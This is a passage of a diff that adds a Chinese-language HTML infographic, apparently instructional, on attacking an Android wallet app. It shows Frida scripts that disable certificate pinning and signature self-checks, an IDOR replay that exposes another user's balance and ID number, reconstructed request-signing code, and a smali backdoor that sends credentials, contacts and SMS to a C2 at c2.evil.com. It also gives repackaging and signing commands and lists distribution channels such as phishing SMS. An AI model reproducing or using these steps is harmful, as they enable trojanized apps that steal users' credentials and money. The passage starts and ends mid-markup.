+        <path d="M87 74 L87 70 A3 3 0 0 1 93 70 L93 74" fill="none" stroke="#20c997" stroke-width="2.5"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">解pin人</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#20c997">5b</div>
+      <div class="step-name">Pinning 绕过</div>
+    </div>
+    <div class="card c5">
+      <h2>🔓 SSL Pinning 绕过 <span class="en">Unpinning</span> <span class="parent-tag">⑤ 流量</span></h2>
+      <div class="desc">有了 Pinning 也不代表安全。通用 unpinning 脚本<strong>覆盖所有主流实现</strong>，一次 hook 全部缴械。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>带证书固定的 App</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>被解除的证书校验</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">逐层解除证书校验</span> ⬇️</div>
+      <div class="code"><span class="lbl">unpinning.js</span>
+<span class="t">Java</span>.<span class="f">perform</span>(<span class="k">function</span> () {
+  <span class="c">// ① 系统 TrustManager</span>
+  <span class="k">var</span> TM = <span class="t">Java</span>.<span class="f">use</span>(<span class="s">"com.android.org.conscrypt.TrustManagerImpl"</span>);
+  <span class="c">// 若该方法存在多个重载，同样改用 .overload(...) 指定签名</span>
+  TM.<span class="f">checkTrustedRecursive</span>.<span class="f">implementation</span> = <span class="k">function</span> () {
+    <span class="k">return</span> <span class="t">Java</span>.<span class="f">use</span>(<span class="s">"java.util.ArrayList"</span>).<span class="f">$new</span>();  <span class="c">// 永远信任</span>
+  };
+
+  <span class="c">// ② OkHttp CertificatePinner</span>
+  <span class="k">var</span> P = <span class="t">Java</span>.<span class="f">use</span>(<span class="s">"okhttp3.CertificatePinner"</span>);
+  P.<span class="f">check</span>.<span class="f">overload</span>(<span class="s">'java.lang.String'</span>, <span class="s">'java.util.List'</span>)
+   .<span class="f">implementation</span> = <span class="k">function</span> () { };   <span class="c">// 空实现</span>
+
+  <span class="c">// ③ WebView 的 SSL 错误</span>
+  <span class="k">var</span> W = <span class="t">Java</span>.<span class="f">use</span>(<span class="s">"android.webkit.WebViewClient"</span>);
+  W.<span class="f">onReceivedSslError</span>.<span class="f">implementation</span> = <span class="k">function</span> (v, h, e) {
+    h.<span class="f">proceed</span>();                        <span class="c">// 无视证书错误</span>
+  };
+});
+</div>
+      <div class="tips">
+        <span class="tip info">常见四大目标：TrustManagerImpl / OkHttp CertificatePinner / WebViewClient / 自研 Native 校验</span>
+        <span class="tip warn">双向认证（mTLS）要额外从 APK 或内存中提取客户端证书</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 5c -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b5">改个数字，别人的钱包就归我了</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#20c997" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#20c997"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#20c997"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#20c997" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="9" font-weight="900" fill="#20c997" font-family="monospace">TAMPER</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="80" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 78 L98 88 M84 88 L98 78" stroke="#20c997" stroke-width="3" stroke-linecap="round"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">篡改者</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#20c997">5c</div>
+      <div class="step-name">重放与篡改</div>
+    </div>
+    <div class="card c5">
+      <h2>✏️ 重放与篡改 <span class="en">Replay &amp; Tamper</span> <span class="parent-tag">⑤ 流量</span></h2>
+      <div class="desc">抓包只是手段，<strong>改包才是目的</strong>。这里能验证出最致命的漏洞：<strong>水平越权（IDOR）</strong>。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>原始合法请求</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>他人数据 / 被篡改的业务结果</div>
+      </div>
+      <div class="code"><span class="lbl">① 原始请求（Burp Repeater）</span>
+<span class="p">POST</span> /api/v1/user/profile <span class="t">HTTP/1.1</span>
+<span class="at">Authorization:</span> Bearer eyJhbGciOiJIUzI1NiJ9...
+<span class="at">Content-Type:</span> application/json
+
+{<span class="at">"userId"</span>: <span class="n">10086</span>}          <span class="c">← 自己的合法请求</span>
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">只把 userId 改成 10087</span> ⬇️</div>
+      <div class="code"><span class="lbl">② 响应：别人的数据</span>
+<span class="t">HTTP/1.1 200 OK</span>
+{<span class="at">"userId"</span>: <span class="n">10087</span>,
+ <span class="at">"phone"</span>: <span class="s">"138****8888"</span>,
+ <span class="at">"balance"</span>: <span class="e">98234.50</span>,        <span class="c">← 别人的余额</span>
+ <span class="at">"idCard"</span>: <span class="e">"3301**********1234"</span>}
+</div>
+      <div class="tips">
+        <span class="tip warn">改一个参数就拿到别人数据 = 水平越权，危害等级最高</span>
+        <span class="tip warn">写个脚本遍历 userId，就是一次批量拖库</span>
+        <span class="tip info">同类检查：金额篡改、数量负数、角色字段提权</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 5d -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b5">你这签名，我照着抄一份</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#20c997" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#20c997"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#20c997"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#20c997" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="11" font-weight="900" fill="#20c997" font-family="monospace">SIGN</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="90" y2="82" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 88 Q88 74 92 84 Q95 92 99 78" fill="none" stroke="#20c997" stroke-width="3"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#20c997" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">签名匠</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#20c997">5d</div>
+      <div class="step-name">协议逆向</div>
+    </div>
+    <div class="card c5">
+      <h2>🧩 协议与签名逆向 <span class="en">Protocol RE</span> <span class="parent-tag">⑤ 流量</span></h2>
+      <div class="desc">接口有签名校验？<strong>签名算法一定在客户端，就一定能被还原</strong>。从 so 或 Java 层还原出拼接顺序与盐值，此后可离线构造任意"合法"请求。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>带签名的加密请求</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>签名算法 + 盐值 → 可任意伪造请求</div>
+      </div>
+      <div class="code"><span class="lbl">① 抓到的加密请求</span>
+{<span class="at">"userId"</span>:<span class="n">10086</span>, <span class="at">"ts"</span>:<span class="n">1735660800</span>, <span class="at">"sign"</span>:<span class="s">"a660d5a8fd10e0de93fe3e1cc2a9ee91"</span>}
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">对照 2c 反编译出的 ApiClient.java</span> ⬇️</div>
+      <div class="code"><span class="lbl">② 还原出的签名算法</span>
+<span class="t">String</span> raw  = userId + ts + <span class="s">"S3cr3t_S@lt"</span>;
+<span class="t">String</span> sign = <span class="t">MD5</span>.<span class="f">hex</span>(raw);
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">攻击者本地离线复现</span> ⬇️</div>
+      <div class="code"><span class="lbl">③ 任意伪造合法请求</span>
+<span class="k">def</span> <span class="f">gen_sign</span>(uid, ts):
+    <span class="k">return</span> <span class="f">md5</span>(<span class="s">f"{uid}{ts}S3cr3t_S@lt"</span>.<span class="f">encode</span>()).<span class="f">hexdigest</span>()
+
+<span class="r">→ 签名机制彻底失效，可伪造任意用户、任意时间的请求</span>
+</div>
+      <div class="tips">
+        <span class="tip info">算法在客户端 = 算法公开。对抗只能靠服务端风控 + 设备指纹</span>
+        <span class="tip warn">算法藏在 so 里就走 2d，藏在内存里就走 4d，绕不开</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== PHASE 6 ==================== -->
+  <div class="phase-divider right">
+    <div class="phase-banner p6">
+      <div class="phase-title">💣 ⑥ 重打包与投毒 Repackage &amp; Weaponize</div>
+      <div class="cmd">$ apktool b decoded/ -o patched.apk &amp;&amp; apksigner sign --ks evil.jks patched.apk</div>
+    </div>
+  </div>
+
+  <!-- 6a -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b6">加一行代码，它就成了我的</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ffd93d" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ffd93d"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ffd93d"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ffd93d" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="9" font-weight="900" fill="#ffd93d" font-family="monospace">INJECT</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="80" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 78 L96 72 L96 88 L84 82" fill="none" stroke="#ffd93d" stroke-width="3" stroke-linejoin="round"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">注毒手</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ffd93d; color:#3a2a00">6a</div>
+      <div class="step-name">代码注入</div>
+    </div>
+    <div class="card c6">
+      <h2>💉 代码注入 <span class="en">Smali Injection</span> <span class="parent-tag">⑥ 投毒</span></h2>
+      <div class="desc">在 2e 生成的 smali 里插入后门。投毒的关键是<strong>用户完全无感</strong>——所有功能必须照常工作，只是在背后多做一件事。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>decoded/smali 源码</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>带后门的 smali</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">插入一行 invoke-static</span> ⬇️</div>
+      <div class="code"><span class="lbl">LoginActivity.smali</span>
+<span class="c"># 在 onCreate 里插一行：</span>
+<span class="k">invoke-static</span> {p0}, <span class="r">Lcom/evil/Payload;-&gt;init(Landroid/content/Context;)V</span>
+
+<span class="c"># Payload 干三件事：</span>
+<span class="c">#  1. 用户每次登录，凭据实时回传 C2</span>
+<span class="c">#  2. 静默上传通讯录 / 短信 / 位置</span>
+<span class="c">#  3. 原有功能完全正常 —— 用户毫无察觉</span>
+
+<span class="c"># 最低成本的改法：只改一行常量</span>
+<span class="k">const-string</span> v0, <span class="s">"http://api.vuln.internal:8080"</span>
+<span class="k">const-string</span> v0, <span class="e">"http://c2.evil.com:8080"</span>       <span class="c"># 全部流量改道</span>
+</div>
+      <div class="tips">
+        <span class="tip warn">用户无感是投毒成功的前提 —— 功能必须完全正常</span>
+        <span class="tip info">也可注入动态加载逻辑，把真正的恶意代码放在远程 dex 里，规避静态检测</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 6b -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b6">重新焊起来</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ffd93d" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ffd93d"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ffd93d"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ffd93d" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="9" font-weight="900" fill="#ffd93d" font-family="monospace">BUILD</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="90" y2="80" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <path d="M84 74 L94 80 L84 86" fill="none" stroke="#ffd93d" stroke-width="3" stroke-linejoin="round"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">回编工</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ffd93d; color:#3a2a00">6b</div>
+      <div class="step-name">重打包</div>
+    </div>
+    <div class="card c6">
+      <h2>🔧 重打包 <span class="en">Rebuild</span> <span class="parent-tag">⑥ 投毒</span></h2>
+      <div class="desc">把改过的 smali 和资源重新编译回 APK。这一步技术含量不高，但<strong>对齐和签名细节漏一个就装不上</strong>。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>修改后的 smali + 资源</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>未签名的新 APK</div>
+      </div>
+      <div class="code"><span class="lbl">① 回编译</span>
+$ apktool b decoded/ -o patched.apk
+I: Using Apktool 2.9.3
+I: Smaling smali folder into classes.dex...
+I: Building resources...
+<span class="r">I: Building apk file...</span>
+</div>
+      <div class="transform-arrow">⬇️ <span class="label">4 字节对齐</span> ⬇️</div>
+      <div class="code"><span class="lbl">② 对齐</span>
+$ zipalign -v <span class="n">4</span> patched.apk aligned.apk
+<span class="c"># 未对齐时，targetSdk ≥ 30 的应用在 Android 11+ 上会安装失败</span>
+</div>
+      <div class="tips">
+        <span class="tip warn">忘了 zipalign → targetSdk ≥ 30 的应用在 Android 11+ 安装失败</span>
+        <span class="tip info">只改 dex 不改资源时，可直接替换 ZIP 内条目，速度更快也更隐蔽</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 6c -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b6">盖个假章，齐活</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ffd93d" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ffd93d"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ffd93d"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ffd93d" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="9" font-weight="900" fill="#ffd93d" font-family="monospace">SIGN</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="80" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <rect x="84" y="76" width="14" height="14" rx="2" fill="none" stroke="#ffd93d" stroke-width="3"/>
+        <circle cx="91" cy="83" r="4" fill="none" stroke="#ffd93d" stroke-width="2"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">刻章人</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ffd93d; color:#3a2a00">6c</div>
+      <div class="step-name">签名打包</div>
+    </div>
+    <div class="card c6">
+      <h2>🖊️ 签名与校验绕过 <span class="en">Sign &amp; Bypass</span> <span class="parent-tag">⑥ 投毒</span></h2>
+      <div class="desc">Android 要求所有 APK 必须签名。用自己的密钥签就行；<strong>如果 App 有签名自校验，再 hook 一次它</strong>。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>未签名 APK</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>可安装的仿冒 APK</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">用自签名密钥签署</span> ⬇️</div>
+      <div class="code"><span class="lbl">终端</span>
+$ keytool -genkey -v -keystore evil.jks -alias evil \
+    -keyalg RSA -keysize <span class="n">2048</span> -validity <span class="n">10000</span>
+$ apksigner sign --ks evil.jks --out final.apk aligned.apk
+$ apksigner verify --print-certs final.apk
+Signer #1: <span class="e">CN=Evil, O=EvilCorp</span>          <span class="c">← 签名已换人</span>
+
+<span class="c"># 若 App 有签名自校验，frida 兜底：</span>
+<span class="t">Java</span>.<span class="f">perform</span>(<span class="k">function</span> () {
+  <span class="k">var</span> PM = <span class="t">Java</span>.<span class="f">use</span>(<span class="s">"android.app.ApplicationPackageManager"</span>);
+  <span class="c">// getPackageInfo 有多个重载，必须用 .overload(...) 指定签名</span>
+  <span class="k">var</span> origGetInfo = PM.<span class="f">getPackageInfo</span>
+                      .<span class="f">overload</span>(<span class="s">'java.lang.String'</span>, <span class="s">'int'</span>);   <span class="c">// ① 先保存原方法</span>
+  origGetInfo.<span class="f">implementation</span> = <span class="k">function</span> (pkg, flags) {
+    <span class="k">var</span> info = origGetInfo.<span class="f">call</span>(<span class="k">this</span>, pkg, flags);   <span class="c">// ② 调原方法，不会递归</span>
+    info.<span class="f">signatures</span> = <span class="r">ORIGINAL_SIGS</span>;    <span class="c">// 返回原始签名</span>
+    <span class="k">return</span> info;
+  };
+});
+</div>
+      <div class="tips">
+        <span class="tip warn">签名变了 → 无法覆盖安装原版（须先卸载），且部分服务端会校验签名</span>
+        <span class="tip info">校验绕过思路：hook getPackageInfo / getInstallerPackageName / 直接改判定分支</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 6d -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble b6">现在，它替我打工了</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ffd93d" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ffd93d"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ffd93d"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <rect x="40" y="53" width="20" height="4" rx="2" fill="#0f0f23" opacity="0.5"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ffd93d" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="9" font-weight="900" fill="#ffd93d" font-family="monospace">SPREAD</text>
+        <line x1="26" y1="76" x2="12" y2="84" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="88" y2="84" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="92" cy="80" r="3" fill="#ffd93d"/><circle cx="92" cy="90" r="3" fill="#ffd93d"/>
+        <circle cx="99" cy="85" r="3" fill="#ffd93d"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">分发者</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ffd93d; color:#3a2a00">6d</div>
+      <div class="step-name">二次分发</div>
+    </div>
+    <div class="card c6">
+      <h2>📤 二次分发 <span class="en">Distribution</span> <span class="parent-tag">⑥ 投毒</span></h2>
+      <div class="desc">这一步把<strong>技术漏洞升级为真实伤害</strong>。用户看到的是图标一样、名字一样、功能一样的 App——毫无察觉。</div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>仿冒 APK</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>大规模用户凭据 / 供应链投毒</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">投递到分发渠道</span> ⬇️</div>
+      <div class="code"><span class="lbl">投递渠道</span>
+<span class="r">第三方应用市场</span>     <span class="c">← 上传审核宽松，可长期挂着</span>
+<span class="r">钓鱼短信 / 微信群文件</span> <span class="c">← "银行 App 升级通知，请点击安装"</span>
+<span class="r">伪装成"内测版 / 加速版"</span>
+<span class="r">污染 CDN / 劫持下载链接</span>
+
+<span class="c">用户视角：</span>
+图标 ✓  名称 ✓  功能 ✓  界面 ✓        <span class="c">← 完全一致，无感</span>
+<span class="c">背后：</span>
+每次登录 → 凭据实时回传 C2 → 攻击者直接登录真实账户
+</div>
+      <div class="tips">
+        <span class="tip warn">防御方要抓的两个点：签名不一致 + 非官方渠道分发</span>
+        <span class="tip info">这也是为什么"应用商店签名校验 + 渠道来源校验"是必需品</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== ★ 终点 ==================== -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble b6">从 4.2 MB 的安装包，到整个后端</div>
+      <svg viewBox="0 0 100 120">
+        <line x1="50" y1="12" x2="50" y2="24" stroke="#ffd93d" stroke-width="3"/>
+        <circle cx="50" cy="9" r="5" fill="#ffd93d"/>
+        <rect x="24" y="22" width="52" height="42" rx="12" fill="#ffd93d"/>
+        <circle cx="39" cy="41" r="6" fill="#0f0f23"/><circle cx="61" cy="41" r="6" fill="#0f0f23"/>
+        <circle cx="41" cy="39" r="2" fill="#fff"/><circle cx="63" cy="39" r="2" fill="#fff"/>
+        <path d="M38 55 L44 51 L50 55 L56 51 L62 55" fill="none" stroke="#0f0f23" stroke-width="2.5" opacity="0.6"/>
+        <rect x="26" y="68" width="48" height="34" rx="8" fill="#1f1f3a" stroke="#ffd93d" stroke-width="3"/>
+        <text x="50" y="90" text-anchor="middle" font-size="11" font-weight="900" fill="#ffd93d" font-family="monospace">PWN</text>
+        <line x1="26" y1="76" x2="10" y2="72" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="74" y1="76" x2="90" y2="72" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <path d="M6 68 L14 72 L6 76" fill="none" stroke="#ffd93d" stroke-width="3" stroke-linejoin="round"/>
+        <path d="M94 68 L86 72 L94 76" fill="none" stroke="#ffd93d" stroke-width="3" stroke-linejoin="round"/>
+        <line x1="38" y1="102" x2="38" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <line x1="62" y1="102" x2="62" y2="112" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">占领者</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:#ffd93d; color:#3a2a00">★</div>
+      <div class="step-name">完整沦陷</div>
+    </div>
+    <div class="card c6">
+      <h2>☠️ 终点：完整沦陷 <span class="en">Total Compromise</span> <span class="parent-tag">⑥ 投毒</span></h2>
+      <div class="desc">从静态到动态、从客户端到服务端、从单个样本到全量用户。<strong>一个 APK 文件，最终撬动了整个业务体系。</strong></div>
+      <div class="io">
+        <div class="io-box in"><div class="tag">📥 输入</div>六阶段全部产出</div>
+        <div class="io-box out"><div class="tag">📤 输出</div>凭据 / 数据 / 接口 / 内网 / 用户</div>
+      </div>
+      <div class="transform-arrow">⬇️ <span class="label">汇总六阶段全部产出</span> ⬇️</div>
+      <div class="code"><span class="lbl">战利品清单</span>
+<span class="r">[客户端]</span> AES 密钥 1234567890abcdef、签名盐值 S3cr3t_S@lt
+<span class="r">[凭据]</span>   JWT Token、测试账号 test-admin-2023、用户明文密码
+<span class="r">[接口]</span>   /api/v1/* 全量接口 + 参数结构 + 签名算法
+<span class="r">[内网]</span>   api.vuln.internal:8080、10.20.30.41:6379 (Redis)
+<span class="r">[数据]</span>   wallet.db、SharedPreferences、日志中的身份证/卡号
+
+<span class="at">──── 破坏能力 ────</span>
+<span class="e">▸ 批量越权拖库</span>     遍历 userId 即可拉取全量用户资料
+<span class="e">▸ 伪造任意用户请求</span>   签名算法已还原，可离线构造合法请求
+<span class="e">▸ 资金/业务篡改</span>     改包即可修改金额、订单、角色
+<span class="e">▸ 供应链投毒</span>       重打包分发，窃取全量用户的实时凭据
+<span class="e">▸ 内网横向渗透</span>     以泄露的内网地址为跳板攻击后端
+</div>
+      <div class="tips">
+        <span class="tip pwn">攻击链的每一环都不难，难的是没人去检查</span>
+        <span class="tip info">加固只能提高成本，不能消除风险 —— 真正的边界在服务端</span>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /factory -->
+
+<!-- ==================== SUMMARY ==================== -->
+<div class="summary">
+  <h2>🗂️ 全流程总览</h2>
+  <table>
+    <thead>
+      <tr>
+        <th style="width:9%">步骤</th>
+        <th style="width:15%">阶段</th>
+        <th style="width:20%">📥 输入</th>
+        <th style="width:20%">📤 输出</th>
+        <th style="width:36%">核心动作 / 战利品</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>S</strong></td>
+        <td><span class="dot" style="background:#8890b0"></span>起点</td>
+        <td>一个二进制安装包</td>
+        <td>一个待解剖的黑盒</td>
+        <td>确认目标，规划攻击面：代码 + 资源 + Native + 网络 + 运行时</td>
+      </tr>
+      <tr>
+        <td><strong>1a</strong></td>
+        <td><span class="dot" style="background:#ff6b6b"></span>静态侦察</td>
+        <td>demo-wallet.apk</td>
+        <td>SHA-256 / 打包特征 / 签名主体</td>
+        <td><code>file</code> / <code>shasum</code> / <code>apksigner</code> 给样本验明正身</td>
+      </tr>
+      <tr>
+        <td><strong>1b</strong></td>
+        <td><span class="dot" style="background:#ff6b6b"></span>静态侦察</td>
+        <td>二进制 AXML</td>
+        <td>攻击入口清单 / 权限面 / 深链路径</td>
+        <td>找 exported 组件、危险权限、深链、allowBackup、cleartext</td>
+      </tr>
+      <tr>
+        <td><strong>1c</strong></td>
+        <td><span class="dot" style="background:#ff6b6b"></span>静态侦察</td>
+        <td>classes.dex / resources.arsc</td>
+        <td>后端地址 / 疑似密钥 / 内网资产</td>
+        <td><code>strings + grep</code>：零成本捞走 AES_KEY、test-admin-2023、10.20.30.41</td>
+      </tr>
+      <tr>
+        <td><strong>1d</strong></td>
+        <td><span class="dot" style="background:#ff6b6b"></span>静态侦察</td>
+        <td>lib/ 目录 + Application 类名</td>
+        <td>加固方案判定 / 路线决策</td>
+        <td>识别 360/梆梆/乐固特征；本样本无壳 → 直接反编译</td>
+      </tr>
+      <tr>
+        <td><strong>2a</strong></td>
+        <td><span class="dot" style="background:#4d96ff"></span>脱壳反编译</td>
+        <td>demo-wallet.apk</td>
+        <td>dex / arsc / so / 签名 目录树</td>
+        <td><code>unzip</code> 拆出五类资产，定位 classes.dex 与 native 库</td>
+      </tr>
+      <tr>
+        <td><strong>2b</strong></td>
+        <td><span class="dot" style="background:#4d96ff"></span>脱壳反编译</td>
+        <td>运行中的加固 App</td>
+        <td>解密后的真实 classes.dex</td>
+        <td>frida-dexdump / FART 从内存抠出明文 dex（本样本无壳，跳过）</td>
+      </tr>
+      <tr>
+        <td><strong>2c</strong></td>
+        <td><span class="dot" style="background:#4d96ff"></span>脱壳反编译</td>
+        <td>classes.dex</td>
+        <td>可搜索、可跳转的 Java 源码树</td>
+        <td><code>jadx</code> 还原出 LoginActivity / WebActivity / ApiClient / CryptoUtil</td>
+      </tr>
+      <tr>
+        <td><strong>2d</strong></td>
